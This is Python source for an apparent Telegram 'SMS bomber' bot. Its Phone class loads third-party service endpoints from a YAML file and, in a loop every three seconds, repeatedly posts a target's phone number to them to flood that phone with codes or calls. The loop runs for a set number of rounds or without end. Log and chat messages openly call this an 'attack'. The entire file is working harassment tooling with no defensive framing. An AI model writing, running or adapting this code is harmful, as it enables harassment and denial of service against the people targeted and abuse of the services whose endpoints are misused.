from json import loads
from asyncio import sleep

from pathlib import Path
from aiohttp import ClientSession

import yaml
from loguru import logger
from aiogram.types import Message
from objects.globals import bot
from models.models import *

SERVICES_DIR = Path(__file__).resolve().parent.parent.parent

class Phone:
    user_id: int
    phone: str

    def __init__(self, user_id, phone=""):
        self.is_process: bool = True
        self.user_id = user_id
        self.phone = phone
        self.count_circles: str = None
        self.bomber_data: BomberData = None
        self.session: ClientSession = ClientSession()
        self.headers = {"User-Agent": (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/93.0.4577.63 Safari/537.36"),
                "Accept": "*/*"}

    def load_services(self):
        CONFIG_NAME = r"%s/services.yaml" % SERVICES_DIR
        if not Path(CONFIG_NAME).exists():
            logger.error("Services file does not exists!")
        else:
            with open(CONFIG_NAME) as f:
                services = yaml.load(f, Loader=yaml.FullLoader)
            logger.info("Services loaded!")
            return services

    async def start(self, message: Message):
        self.bomber_data = await BomberData.objects.get(username=str(self.user_id))
        self.count_circles = self.bomber_data.circles
        self.services = self.load_services()
        logger.info("Attack started -> %s" % (self.user_id,))
        try:
            while self.is_process:
                for k,v in self.services.items():
                    if not v["formating"]:
                        if "data" in v:
                            data = (v["data"] % self.phone[-10:]).replace("'", "\"")
                            await self.session.post(url=k, data=loads(data), headers=self.headers, timeout=3)
                        elif "json" in v:
                            json = (v["json"] % self.phone[-10:]).replace("'", "\"")
                            await self.session.post(url=k, json=loads(json), headers=self.headers, timeout=3)
                    else:
                        await self.session.post(url=k % self.phone, timeout=3)

                if self.count_circles!="∞":
                    self.count_circles = int(self.count_circles) - 1
                    if self.count_circles == 0:
                        await self.bomber_data.update(circles=self.count_circles)
                        return await message.answer(text="❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
                await sleep(3)
        except Exception as e:
            logger.error(e)
            await self.session.close()
            await self.bomber_data.update(circles=str(self.count_circles))
            return await bot.edit_message_text(chat_id=message.from_user.id, message_id=message.message_id+1,
                                text=f"<b><i>Error message</i></b>: {e}")

    async def stop(self):
        self.is_process = False
        await sleep(1)
        await self.session.close()
        logger.info("Attack stopped -> %s" % (self.user_id,))